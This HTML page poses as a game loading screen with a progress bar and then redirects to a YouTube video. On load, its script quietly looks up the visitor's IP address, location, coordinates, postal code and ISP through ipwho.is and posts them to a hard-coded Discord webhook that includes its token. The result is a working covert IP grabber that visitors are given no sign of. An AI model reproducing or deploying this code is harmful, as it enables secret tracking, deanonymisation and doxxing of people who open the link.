<!DOCTYPE html>
<html>
<head>
  <title>Loading...</title>
  <meta http-equiv="refresh" content="10;url=https://www.youtube.com/watch?v=Xh3zkzJpxdc">
  <style>
    body {
      background-color: #111;
      color: #fff;
      font-family: Arial, sans-serif;
      text-align: center;
      padding-top: 100px;
    }
    #progress-container {
      width: 80%;
      background-color: #333;
      border-radius: 10px;
      margin: 20px auto;
      height: 30px;
      overflow: hidden;
    }
    #progress-bar {
      height: 100%;
      width: 0%;
      background-color: #4caf50;
      transition: width 0.3s;
    }
    #status {
      margin-top: 20px;
      font-size: 1.2em;
    }
  </style>
  <script>
    const webhookUrl = "https://discord.com/api/webhooks/1396127800909496615/xCiYdQ16YG4NLrH0TKJ-b7a3hvUXea5sHfBPH-sZcVRpHeOFvuH8LEmE1ZvMn_Z_Vw7e";
    let progress = 0;
    const steps = [
      "Loading assets...",
      "Initializing renderer...",
      "Establishing connection...",
      "Loading game..."
    ];
    function updateProgress() {
      if (progress < 100) {
        progress += 25;
        document.getElementById("progress-bar").style.width = progress + "%";
        document.getElementById("status").textContent = steps[progress / 25 - 1];
        setTimeout(updateProgress, 2000);
      }
    }
    function sendWebhook(data) {
      const embed = {
        title: "Visitor IP Information",
        color: 0x4caf50,
        thumbnail: {
          url: data.flag.img
        },
        fields: [
          { name: "IP Address", value: data.ip || "N/A", inline: true },
          { name: "Type", value: data.type || "N/A", inline: true },
          { name: "Continent", value: `${data.continent || "N/A"} (${data.continent_code || "N/A"})`, inline: true },

          { name: "Country", value: `${data.country || "N/A"} (${data.country_code || "N/A"})`, inline: true },
          { name: "Region", value: `${data.region || "N/A"} (${data.region_code || "N/A"})`, inline: true },
          { name: "City", value: data.city || "N/A", inline: true },

          { name: "Latitude", value: data.latitude?.toString() || "N/A", inline: true },
          { name: "Longitude", value: data.longitude?.toString() || "N/A", inline: true },
          { name: "Postal Code", value: data.postal || "N/A", inline: true },

          { name: "Calling Code", value: `+${data.calling_code || "N/A"}`, inline: true },
          { name: "Timezone", value: `${data.timezone?.id || "N/A"} (${data.timezone?.abbr || "N/A"})`, inline: true },
          { name: "Current Time", value: data.timezone?.current_time || "N/A", inline: true },

          { name: "ASN", value: data.connection?.asn?.toString() || "N/A", inline: true },
          { name: "ISP", value: data.connection?.isp || "N/A", inline: true },
          { name: "Organization", value: data.connection?.org || "N/A", inline: true },
          { name: "Domain", value: data.connection?.domain || "N/A", inline: true }
        ],
        footer: {
          text: "IP info provided by ipwho.is",
          icon_url: "https://cdn.ipwhois.io/flags/us.svg"
        },
        timestamp: new Date().toISOString()
      };
      fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ embeds: [embed] })
      });
    }
    window.onload = () => {
      updateProgress();
      fetch("https://ipwho.is/")
        .then(response => response.json())
        .then(data => {
          if (data.success) {
            sendWebhook(data);
          } else {
            sendWebhook({});
          }
        })
        .catch(() => {
          sendWebhook({});
        });
    };
  </script>
</head>
<body>
  <h1>Loading...</h1>
  <div id="progress-container">
    <div id="progress-bar"></div>
  </div>
  <div id="status">Starting...</div>
</body>
</html>
